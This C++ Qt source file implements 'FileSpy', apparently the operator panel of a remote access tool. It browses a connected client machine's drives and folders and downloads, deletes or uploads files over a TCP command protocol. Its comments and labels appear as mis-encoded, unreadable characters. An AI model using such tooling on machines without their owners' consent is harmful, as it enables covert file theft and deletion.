#include "FileSpy.h"

FileSpy::FileSpy(QWidget* parent) : QWidget(parent), mSock(0)
{
    // ��ʼ��·��
    _curClientDir.setPath("");
    _curServerDir.setPath(QDir::currentPath());

    // ��ʼ������
    const int w = 500, h = 600;
    const int x = (QApplication::desktop()->width() - w) >> 1;
    const int y = (QApplication::desktop()->height() - h) >> 1;
    this->setGeometry(x, y, w, h);
    this->setMinimumSize(w, h);
    this->setMaximumSize(w, h);

    // ������ʾ
    QLabel* lbClient = new QLabel("�ͻ��˵���:", this);
    lbClient->setGeometry(10, 10, 100, 20);
    QLabel* lbServer = new QLabel("�ҵĵ���:", this);
    lbServer->setGeometry(10, 300, 100, 30);

    // �����ļ��б�
    mClientFileList = new QListWidget(this);
    mClientFileList->setGeometry(10, 30, 480, 260);
    connect(mClientFileList, SIGNAL(itemDoubleClicked(QListWidgetItem*)), this, SLOT(loadClientDir(QListWidgetItem*)));

    mServerFileList = new QListWidget(this);
    mServerFileList->setGeometry(10, 330, 480, 260);
    connect(mServerFileList, SIGNAL(itemDoubleClicked(QListWidgetItem*)), this, SLOT(loadServerDir(QListWidgetItem*)));

    // �ͻ����б�Ĳ����˵�
    mClientMenu = new QMenu(this);
    QAction* actClientRefresh = mClientMenu->addAction("ˢ��");
    connect(actClientRefresh, SIGNAL(triggered(bool)), this, SLOT(refreshClientList()));
    QAction* actDownload = mClientMenu->addAction("����");
    connect(actDownload, SIGNAL(triggered(bool)), this, SLOT(downloadFile()));
    QAction* actDelete = mClientMenu->addAction("ɾ��");
    connect(actDelete, SIGNAL(triggered(bool)), this, SLOT(deleteFile()));

    // ���б�����������¼���أ����һ�����ʱ���ܵ����˵�
    mClientFileList->installEventFilter(this);

    // �����б�Ĳ����˵�
    mServerMenu = new QMenu(this);
    QAction* actServerRefresh = mServerMenu->addAction("ˢ��");
    connect(actServerRefresh, SIGNAL(triggered(bool)), this, SLOT(refreshServerList()));
    QAction* actUpload = mServerMenu->addAction("�ϴ�");
    connect(actUpload, SIGNAL(triggered(bool)), this, SLOT(uploadFile()));

    // ���б�����������¼���أ����һ�����ʱ���ܵ����˵�
    mServerFileList->installEventFilter(this);
}

int FileSpy::startFileSpyServer(QString userName)
{
    // ���ô��ڱ���
    _userName = userName;
    this->setWindowTitle(userName.append("-�ļ����"));

    // �����µķ����
    mServer = new TcpServer(this);
    connect(mServer, SIGNAL(newConnection(QTcpSocket*)), this, SLOT(newConnection(QTcpSocket*)));

    mServer->start(0);
    if (!mServer->server()->isListening()) {
        qDebug() << "�����ļ���ط����ʧ��";
        deleteLater();
        return -1;
    }

    // ������ش���
    this->show();

    return mServer->server()->serverPort();
}

void FileSpy::addFilesToList(QListWidget* list, QList<QByteArray> strList, QFileIconProvider::IconType iconType)
{
    foreach(QByteArray bs, strList) {
        QString s = QString::fromLocal8Bit(bs);
        if (s.size() > 0) {
            QListWidgetItem* item = new QListWidgetItem(list);

            // ����ͷ��
            item->setIcon(QFileIconProvider().icon(iconType));

            // �����ļ����б�
            item->setText(s);
            list->addItem(item);
        }
    }
}

QString FileSpy::getCurrentFile(QListWidget* list)
{
    if (list->currentRow() >= 0) {
        return list->item(list->currentRow())->text();
    }
    return "";
}

QList<QByteArray> FileSpy::getLocalDrives()
{
    // ��ȡ�����̷�
    QFileInfoList fileList = QDir::drives();
    QList<QByteArray> baList;
    foreach(QFileInfo info, fileList) {
        baList.append(info.filePath().toLocal8Bit());
    }
    return baList;
}

QList<QByteArray> FileSpy::getLocalDirs(QDir dir)
{
    // ��ȡĿ¼�µ�����Ŀ¼
    QList<QByteArray> baList;
    QList<QString> strList = dir.entryList(QDir::Dirs);
    foreach(QString s, strList) {
        if (s != "." && s != "..") {
            baList.append(s.toLocal8Bit());
        }
    }
    return baList;
}

QList<QByteArray> FileSpy::getLocalFiles(QDir dir)
{
    // ��ȡ����Ŀ¼�µ��ļ�
    QList<QByteArray> baList;
    QList<QString> strList = dir.entryList(QDir::Files);
    foreach(QString s, strList) {
        baList.append(s.toLocal8Bit());
    }
    return baList;
}

void FileSpy::processCommand(QByteArray& cmd, QByteArray& args)
{
    cmd = cmd.toUpper().trimmed();
    QHash<QByteArray, QByteArray> hashArgs = parseArgs(args);

    // ��ȡ�����̷�
    if (cmd == CmdSendDrives) {
        doSendDrives(hashArgs);
        return;
    }

    // ��ȡ�ͻ���Ŀ¼�µ�����Ŀ¼
    if (cmd == CmdSendDirs) {
        doSendDirs(hashArgs);
        return;
    }

    // ��ȡ�ͻ���Ŀ¼�µ������ļ�
    if (cmd == CmdSendFiles) {
        doSendFiles(hashArgs);
        return;
    }

    // ɾ���ļ��ɹ�
    if (cmd == CmdDeleteFileSuccess) {
        QMessageBox::information(this, "��ʾ", "ɾ���ļ��ɹ�");
        return;
    }

    // ɾ���ļ�ʧ��
    if (cmd == CmdDeleteFileFailed) {
        QMessageBox::warning(this, "��ʾ", "ɾ���ļ�ʧ��");
        return;
    }
}

QHash<QByteArray, QByteArray> FileSpy::parseArgs(QByteArray& args)
{
    QList<QByteArray> listArgs = args.split(CmdSplit[0]);

    // �ֽ������Ȼ����������ϣ��
    QHash<QByteArray, QByteArray> hashArgs;
    for (int i = 0; i < listArgs.length() - 1; i += 2) {
        hashArgs.insert(listArgs[i].toUpper().trimmed(),
            listArgs[i + 1].trimmed());
    }

    return hashArgs;
}

void FileSpy::doSendDrives(QHash<QByteArray, QByteArray>& args)
{
    // ����·��
    _curClientDir.setPath("");

    // ����б�
    mClientFileList->clear();

    // ��ӡ���б���
    QList<QByteArray> strList = args["DRIVES"].split(CmdFileSplit[0]);
    addFilesToList(mClientFileList, strList, QFileIconProvider::Drive);
}

void FileSpy::doSendDirs(QHash<QByteArray, QByteArray>& args)
{
    // ����·��
    _curClientDir.setPath(QString::fromLocal8Bit(args["DIR"]));

    // ����б�
    mClientFileList->clear();

    // ��ӡ���б���
    QList<QByteArray> strList = args["DIRS"].split(CmdFileSplit[0]);

    // ������һҳ����
    strList.push_front(_dirBack);

    addFilesToList(mClientFileList, strList, QFileIconProvider::Folder);
}

void FileSpy::doSendFiles(QHash<QByteArray, QByteArray>& args)
{
    // ��ӡ���б���
    QList<QByteArray> strList = args["FILES"].split(CmdFileSplit[0]);
    addFilesToList(mClientFileList, strList, QFileIconProvider::File);
}

void FileSpy::loadClientDir(QListWidgetItem* item)
{
    // ˫����������ļ���

    refreshClientList(item->text());
}

void FileSpy::refreshClientList()
{
    if (mSock) {
        // ��ȡ��ǰ·���µ������ļ�
        QString data;
        data.append(CmdGetDirFiles + CmdSplit);
        data.append("DIR" + CmdSplit + _curClientDir.absolutePath());
        data.append(CmdEnd);
        mSock->write(data.toLocal8Bit());
    }
}

void FileSpy::refreshClientList(QString path)
{
    if (mSock) {
        // ��ȡ��ǰ·���µ������ļ�
        QString data;
        data.append(CmdGetDirFiles + CmdSplit);
        if(_curClientDir.absolutePath().length()>3)  //�̷�ǰ�治�üӷ�б��
            data.append("DIR" + CmdSplit + _curClientDir.absolutePath() + "//" +path);
        else
            data.append("DIR" + CmdSplit + _curClientDir.absolutePath()  + path);
        data.append(CmdEnd);
        mSock->write(data.toLocal8Bit());

        if (_curClientDir.absolutePath().length() > 2)
            _curClientDir.setPath(_curClientDir.absolutePath() +"//" + path);
        else
            _curClientDir.setPath(_curClientDir.absolutePath()  + path);
    }
}

void FileSpy::downloadFile()
{
    QString fileName = getCurrentFile(mClientFileList);
    if (mSock) {
        // ��ʼ�����ļ�
        QDir serverDir = _curServerDir.absoluteFilePath(fileName);
        QDir clientDir = _curClientDir.absoluteFilePath(fileName);
        FileTransfer* ft = new FileTransfer();
        int port = ft->startRecvFileServer(_userName, serverDir.path());

        if (port != -1) {
            // ������������
            QString data;
            data.append(CmdDownloadFile + CmdSplit);
            data.append("FILE_PATH" + CmdSplit + clientDir.path() + CmdSplit);
            data.append("PORT" + CmdSplit + QString::number(port));
            data.append(CmdEnd);
            mSock->write(data.toLocal8Bit());
        }
    }
}

void FileSpy::deleteFile()
{
    if (mSock) {
        // ɾ����ǰ�ļ�
        QString file = getCurrentFile(mClientFileList);
        if (file.size() > 0) {
            QString path = _curClientDir.absoluteFilePath(file);
            qDebug() << path;

            // ��������
            QString data;
            data.append(CmdDeleteFile + CmdSplit);
            data.append("FILE_PATH" + CmdSplit + path);
            data.append(CmdEnd);
            mSock->write(data.toLocal8Bit());

            // ˢ���б�
            refreshClientList();
        }
    }
}

void FileSpy::loadServerDir(QListWidgetItem* item)
{
    // ˫����������ļ���
    QDir dir = _curServerDir;
    dir.cd(item->text());

    if (dir == _curServerDir) {
        dir.setPath("");
    }
    _curServerDir = dir;

    loadServerDir(dir);
}

void FileSpy::loadServerDir(QDir dir)
{
    if (dir.path() == "") {
        // ��ȡ�̷�
        QList<QByteArray> driveList = getLocalDrives();

        // ����б�
        mServerFileList->clear();

        addFilesToList(mServerFileList, driveList, QFileIconProvider::Drive);
    }
    else {
        // ��ȡ·��
        QList<QByteArray> dirList = getLocalDirs(dir);

        // ��ȡ�ļ�
        QList<QByteArray> fileList = getLocalFiles(dir);

        // ����б�
        mServerFileList->clear();

        dirList.push_front(_dirBack);
        addFilesToList(mServerFileList, dirList, QFileIconProvider::Folder);
        addFilesToList(mServerFileList, fileList, QFileIconProvider::File);
    }
}

void FileSpy::refreshServerList()
{
    loadServerDir(_curServerDir);
}

void FileSpy::uploadFile()
{
    QString fileName = getCurrentFile(mServerFileList);
    if (mSock && fileName.size() > 0) {
        // ��ʼ�����ļ�
        QDir serverDir = _curServerDir.absoluteFilePath(fileName);
        QDir clientDir = _curClientDir.absoluteFilePath(fileName);
        FileTransfer* ft = new FileTransfer();
        int port = ft->startSendFileServer(_userName, serverDir.path());

        if (port != -1) {
            // ������������
            QString data;
            data.append(CmdUploadFile + CmdSplit);
            data.append("FILE_PATH" + CmdSplit + clientDir.path() + CmdSplit);
            data.append("PORT" + CmdSplit + QString::number(port));
            data.append(CmdEnd);
            mSock->write(data.toLocal8Bit());
        }
    }
}

void FileSpy::newConnection(QTcpSocket* s)
{
    // �����ͻ�
    mSock = new TcpSocket(s, this);
    connect(mSock, SIGNAL(newData()), this, SLOT(processBuffer()));
    connect(mSock, SIGNAL(disconnected()), this, SLOT(deleteLater()));

    // ��ȡ�ͻ����̷�
    refreshClientList();

    // ��ȡ������ǰĿ¼
    refreshServerList();

    // ���ټ����¿ͻ�
    mServer->server()->close();
}

void FileSpy::processBuffer()
{
    // ��socket���ȡ������
    QByteArray* buf = mSock->buffer();

    int endIndex;
    while ((endIndex = buf->indexOf(CmdEnd)) > -1) {
        // ��ȡһ��ָ��
        QByteArray data = buf->mid(0, endIndex);
        buf->remove(0, endIndex + CmdEnd.length());

        // ��ȡָ��Ͳ���
        QByteArray cmd, args;
        int argIndex = data.indexOf(CmdSplit);
        if (argIndex == -1) {
            cmd = data;
        }
        else {
            cmd = data.mid(0, argIndex);
            args = data.mid(argIndex + CmdSplit.length(), data.length());
        }

        // ����ָ��
        processCommand(cmd, args);
    }
}

bool FileSpy::eventFilter(QObject* watched, QEvent* event)
{
    // �Ҽ������˵�
    if (watched == (QObject*)mClientFileList) {
        if (event->type() == QEvent::ContextMenu) {
            mClientMenu->exec(QCursor::pos());
        }
    }
    else if (watched == (QObject*)mServerFileList) {
        if (event->type() == QEvent::ContextMenu) {
            mServerMenu->exec(QCursor::pos());
        }
    }

    return QObject::eventFilter(watched, event);
}

void FileSpy::closeEvent(QCloseEvent*)
{
    // ɾ������
    deleteLater();
}